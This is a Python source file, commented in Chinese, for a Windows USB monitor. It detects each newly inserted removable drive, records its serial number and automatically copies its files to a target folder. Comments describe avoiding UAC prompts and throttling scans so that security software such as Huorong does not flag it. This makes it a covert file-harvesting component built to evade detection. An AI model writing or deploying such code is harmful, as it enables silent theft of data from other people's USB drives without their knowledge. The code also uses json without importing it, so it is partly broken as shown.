import os
import time
import psutil
from datetime import datetime
import win32api
import win32file
import win32con


class USBMoniTor:
    def __init__(self, config, logger, file_handler):
        self.config = config
        self.logger = logger
        self.file_handler = file_handler
        self.detected_drives = set()
        self.exclude_drives = config.get_exclude_drives()
        self.usb_history = set()  # 记录已处理的U盘

        # 火绒安全兼容性设置
        self.avoid_rapid_scan = True
        self.scan_interval = config.get_check_interval()

    def get_drive_info(self, drive_letter):
        """获取驱动器信息（不使用管理员权限）"""
        try:
            # 使用psutil获取磁盘信息
            for part in psutil.disk_partitions():
                if part.device.startswith(drive_letter):
                    return part.mountpoint, part.fstype
            return drive_letter, "Unknown"
        except:
            return drive_letter, "Unknown"

    def is_removable_drive(self, drive_letter):
        """检查是否为可移动驱动器（不使用win32api的特权操作）"""
        try:
            # 方法1：使用psutil
            for part in psutil.disk_partitions():
                if part.device.startswith(drive_letter):
                    return 'removable' in part.opts.lower()

            # 方法2：使用win32file但避免特权操作
            try:
                drive_type = win32file.GetDriveType(f"{drive_letter}\\")
                return drive_type == win32con.DRIVE_REMOVABLE
            except:
                # 如果失败，尝试其他方法
                pass

            # 方法3：检查常见U盘特征
            try:
                # 尝试读取U盘的卷标（不会触发UAC）
                volume_info = win32api.GetVolumeInformation(f"{drive_letter}\\")
                # 如果成功获取信息，很可能是可移动驱动器
                return True
            except:
                return False

        except Exception as e:
            self.logger.log_debug(f"检查驱动器类型失败 {drive_letter}: {str(e)}")
            return False

    def get_all_drives(self):
        """获取所有可用的驱动器（不使用特权操作）"""
        drives = []

        # 方法1：使用psutil
        try:
            for part in psutil.disk_partitions():
                drive_letter = part.device[:2]  # 获取驱动器号，如 "C:"
                if drive_letter and drive_letter[0] not in self.exclude_drives:
                    drives.append(drive_letter)
        except:
            pass

        # 方法2：使用os模块
        if not drives:
            import string
            for drive_letter in string.ascii_uppercase:
                drive = f"{drive_letter}:"
                if os.path.exists(drive + "\\"):
                    if drive_letter not in self.exclude_drives:
                        drives.append(drive)

        return list(set(drives))  # 去重

    def record_usb_drive(self, drive_letter, drive_name=""):
        """记录U盘驱动器信息"""
        try:
            record_file = os.path.join(self.config.get_target_folder(), "usb_history.json")

            # 读取现有记录
            history = []
            if os.path.exists(record_file):
                try:
                    with open(record_file, 'r', encoding='utf-8') as f:
                        history = json.load(f)
                except:
                    history = []

            # 添加新记录
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            device_id = self.get_device_id(drive_letter)

            # 检查是否已记录
            for record in history:
                if record.get('device_id') == device_id:
                    # 更新最后访问时间
                    record['last_access'] = timestamp
                    break
            else:
                # 新设备
                history.append({
                    'drive_letter': drive_letter,
                    'drive_name': drive_name,
                    'device_id': device_id,
                    'first_seen': timestamp,
                    'last_access': timestamp
                })

            # 保存记录（限制历史记录数量）
            if len(history) > 100:
                history = history[-100:]

            with open(record_file, 'w', encoding='utf-8') as f:
                json.dump(history, f, ensure_ascii=False, indent=2)

        except Exception as e:
            self.logger.log_error(f"记录U盘信息失败: {str(e)}")

    def get_device_id(self, drive_letter):
        """获取设备唯一标识符"""
        try:
            # 使用卷序列号作为设备ID
            volume_info = win32api.GetVolumeInformation(f"{drive_letter}\\")
            serial_number = volume_info[1]
            return f"USB_{serial_number:08X}"
        except:
            # 如果获取失败，使用驱动器号和插入时间
            return f"USB_{drive_letter}_{int(time.time())}"

    def check_new_drives(self):
        """检查新插入的驱动器"""
        try:
            current_drives = set(self.get_all_drives())
            new_drives = current_drives - self.detected_drives

            for drive in new_drives:
                if self.is_removable_drive(drive):
                    # 避免重复处理同一个U盘
                    device_id = self.get_device_id(drive)
                    if device_id in self.usb_history:
                        self.logger.log_debug(f"U盘已处理过: {drive}")
                        continue

                    drive_name = self.get_drive_info(drive)[0]
                    self.logger.log_usb_insert(drive, drive_name)

                    # 记录设备
                    self.usb_history.add(device_id)

                    # 复制文件
                    copied = self.file_handler.copy_files_from_usb(drive)

                    if copied:
                        self.logger.log_info(f"从 {drive} 成功复制 {len(copied)} 个文件")

                    # 记录到历史文件
                    self.record_usb_drive(drive, drive_name)

            self.detected_drives = current_drives

            # 清理旧的设备记录（避免内存泄漏）
            if len(self.usb_history) > 100:
                self.usb_history = set(list(self.usb_history)[-100:])

        except Exception as e:
            self.logger.log_error(f"检查驱动器失败: {str(e)}")

    def start_monitoring(self):
        """开始监控"""
        self.logger.log_info("USB监控程序启动")
        self.detected_drives = set(self.get_all_drives())

        # 火绒安全兼容：避免频繁扫描
        last_scan_time = time.time()

        try:
            while True:
                current_time = time.time()

                # 控制扫描频率，避免被安全软件误报
                if current_time - last_scan_time >= self.scan_interval:
                    self.check_new_drives()
                    last_scan_time = current_time

                # 短暂休眠，减少CPU占用
                time.sleep(0.5)

        except KeyboardInterrupt:
            self.logger.log_info("监控程序被用户中断")
        except Exception as e:
            self.logger.log_error(f"监控过程中发生错误: {str(e)}")